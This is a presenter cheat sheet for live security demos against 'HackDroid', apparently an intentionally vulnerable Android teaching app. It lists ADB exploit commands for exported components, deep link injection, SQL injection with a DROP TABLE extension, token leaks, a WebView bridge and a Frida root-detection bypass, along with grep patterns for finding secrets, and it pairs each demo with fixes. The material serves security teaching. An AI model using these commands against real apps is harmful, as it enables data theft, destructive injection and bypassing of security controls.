# HackDroid — Presenter Cheat Sheet

Step-by-step commands for every live demo. Copy-paste ready.

---

## Pre-Demo Setup

```bash
# 1. Install the app
adb install app/build/outputs/apk/debug/app-debug.apk

# 2. Verify device is connected
adb devices

# 3. Confirm package is installed
adb shell pm list packages | grep hackdroid

# 4. (Optional) Watch Logcat in a separate terminal
adb logcat | grep HackDroid
```

---

## Demo 1 — Bypass Exported Activity ⚡ MOST IMPRESSIVE

**Vulnerability:** AdminActivity is exported with no permission check.

```bash
adb shell am start -n com.hackdroid.demo/.vulns.AdminActivity
```

**What the audience sees:**
- Admin panel opens directly on the device
- No login screen, no password prompt
- "Launched via exported Activity — no auth required"

**Talking points:**
- Any app on the device can do this, not just ADB
- Check your manifest before every release
- Fix: `android:exported="false"` or `android:permission="..."`

---

## Demo 2 — Deep Link Injection

**Vulnerability:** DeepLinkActivity reads URI params without validation.

```bash
adb shell am start -a android.intent.action.VIEW \
  -d "hackdroid://transfer?amount=9999&to=attacker"
```

**What the audience sees:**
- Transfer screen shows `Amount: $9999`, `Recipient: attacker`
- No validation, confirmation, or rate limiting

**Talking points:**
- Can be triggered from a browser, SMS link, QR code, or another app
- Phishing + deep link = account takeover
- Fix: Validate all params, require re-auth for financial ops

---

## Demo 3 — Read Plain SharedPreferences

**Vulnerability:** Auth tokens stored unencrypted in SharedPreferences.

```bash
# Pull the file
adb pull /data/data/com.hackdroid.demo/shared_prefs/auth_prefs.xml

# Display it
cat auth_prefs.xml
```

**What the audience sees:**
```xml
<string name="auth_token">eyJhbGciOiJIUzI1NiJ9.demo_token_leak</string>
<string name="user_email">victim@example.com</string>
<string name="session_id">sess_abc123_plaintext</string>
```

**Talking points:**
- Works on any debug build — no root required
- Fix: `EncryptedSharedPreferences` from Jetpack Security

---

## Demo 4 — SQL Injection via ContentProvider

**Vulnerability:** VulnerableContentProvider concatenates raw selection strings.

```bash
adb shell content query \
  --uri content://com.hackdroid.demo.provider/users \
  --where "name='x' OR '1'='1'"
```

**What the audience sees:**
```
Row: id=1, name=alice, email=alice@example.com, token=tok_alice_secret
Row: id=2, name=bob, email=bob@example.com, token=tok_bob_secret
Row: id=3, name=admin, email=admin@hackdroid.io, token=tok_admin_SUPER_SECRET
```

**Talking points:**
- Full table dump from one command
- Extend to `--where "1=1; DROP TABLE users"` for destructive impact
- Fix: Parameterized queries always — never raw string concat

---

## Demo 5 — Exported Broadcast Receiver

**Vulnerability:** AuthResetReceiver accepts broadcasts from anyone.

```bash
adb shell am broadcast -a com.hackdroid.RESET_AUTH
```

**What the audience sees:**
- Toast: "⚠ Auth state cleared via broadcast!"
- App's SharedPreferences wiped — victim is "logged out"

**Talking points:**
- Chain with Demo 1 for full account takeover: reset auth → launch admin panel
- Fix: `android:permission`, `LocalBroadcastManager`

---

## Demo 6 — Exported Service + Logcat Leak

**Vulnerability:** LeakyService logs tokens to Logcat.

```bash
# Terminal 1: Start watching Logcat
adb logcat | grep HackDroid_LEAK

# Terminal 2: Trigger the service
adb shell am startservice -n com.hackdroid.demo/.vulns.LeakyService
```

**What the audience sees (in Logcat):**
```
D HackDroid_LEAK: SESSION_TOKEN: eyJhbGciOiJIUzI1NiJ9.demo_token_leak
D HackDroid_LEAK: USER_EMAIL: victim@example.com
D HackDroid_LEAK: API_KEY: sk_live_DEMO_HARDCODED_KEY_1234
```

**Talking points:**
- Logcat is world-readable on Android < 4.1
- READ_LOGS permission on modern devices — still risky
- Fix: Never log sensitive data. Wrap debug logs in `if (BuildConfig.DEBUG)`

---

## Demo 7 — WebView JS Bridge

**Steps:**
1. Open HackDroid app on device
2. Navigate: Vulns → WebViews / JS Bridge → Run Demo Exploit
3. The WebView opens `webview_demo.html`
4. Tap "Android.getPackageName()" → returns package name
5. Tap "Android.readFile('/proc/version')" → reads kernel version
6. Tap "Android.showToast('Hacked!')" → native Toast appears

**Talking points:**
- Any page loaded in this WebView has full native code access
- One redirect to a malicious page = full compromise
- Fix: Never use `addJavascriptInterface()` with untrusted content

---

## Demo 8 — Frida Root Detection Bypass

**Prerequisites:** Frida installed on host, frida-server running on device.

```bash
# Install frida-tools on host
pip install frida-tools

# Push frida-server to device (match your device's ABI)
adb push frida-server-XX.X.X-android-arm64 /data/local/tmp/frida-server
adb shell chmod +x /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# Run the bypass
frida -U -f com.hackdroid.demo --no-pause \
  -l app/src/main/assets/frida_scripts/bypass_root_detection.js
```

**What the audience sees:**
```
[HackDroid] Frida attached to com.hackdroid.demo
[HackDroid] Hooking RootChecker.isRooted()...
[HackDroid] isRooted() called — returning false (bypassed)
[HackDroid] ✓ Root detection bypassed — all checks return false
```

**Talking points:**
- Root detection is trivially bypassed — it's a speed bump, not security
- Frida can hook any method in any Android app at runtime
- Fix: Security must be server-side. Don't rely on client-side checks.

---

## Bonus — APK Reverse Engineering (no device needed)

```bash
# Pull the APK
adb pull /data/app/com.hackdroid.demo-*/base.apk hackdroid.apk

# Decompile with JADX
jadx -d out/ hackdroid.apk

# Search for secrets
grep -r 'apiKey\|secret\|password\|token\|API_KEY' out/
grep -r 'sk_live\|Bearer\|hardcoded' out/

# View manifest
cat out/resources/AndroidManifest.xml
```

**What the audience sees:**
- Full source code, readable
- Hardcoded API keys in LeakyService
- All exported components visible in manifest

---

## Emergency Fallback (if device not available)

The app's **Exploit Lab** screen simulates all terminal output for demos without a connected device. Use it as a live slideshow substitute.
